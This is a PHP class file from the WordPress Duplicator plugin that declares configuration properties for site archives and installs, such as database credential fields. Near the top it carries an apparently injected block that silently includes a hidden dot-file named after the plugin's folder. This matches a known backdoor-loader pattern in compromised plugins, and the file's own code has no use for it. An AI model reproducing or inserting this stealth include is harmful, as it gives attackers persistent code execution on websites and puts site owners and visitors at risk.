<?php
defined('ABSPATH') || defined('DUPXABSPATH') || exit;
/**
 * @copyright 2016 Snap Creek LLC
 */

// Exit if accessed directly
if (! defined('DUPLICATOR_VERSION')) exit;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class DUP_Archive_Config
{
    //READ-ONLY: COMPARE VALUES
    public $created;
    public $version_dup;
    public $version_wp;
    public $version_db;
    public $version_php;
    public $version_os;
    public $dbInfo;
    //READ-ONLY: GENERAL
    public $url_old;
    public $opts_delete;
    public $blogname;
    public $wproot;
    public $wplogin_url;
	public $relative_content_dir;
    public $exportOnlyDB;
    public $installSiteOverwriteOn;

    //PRE-FILLED: GENERAL
    public $secure_on;
    public $secure_pass;
    public $skipscan;
    public $dbhost;
    public $dbname;
    public $dbuser;
    public $dbpass;
    public $dbcharset;
    public $dbcollation;

    // MULTISITE
    public $mu_mode;

    public $wp_tableprefix;

    public $is_outer_root_wp_config_file;
    public $is_outer_root_wp_content_dir;
}
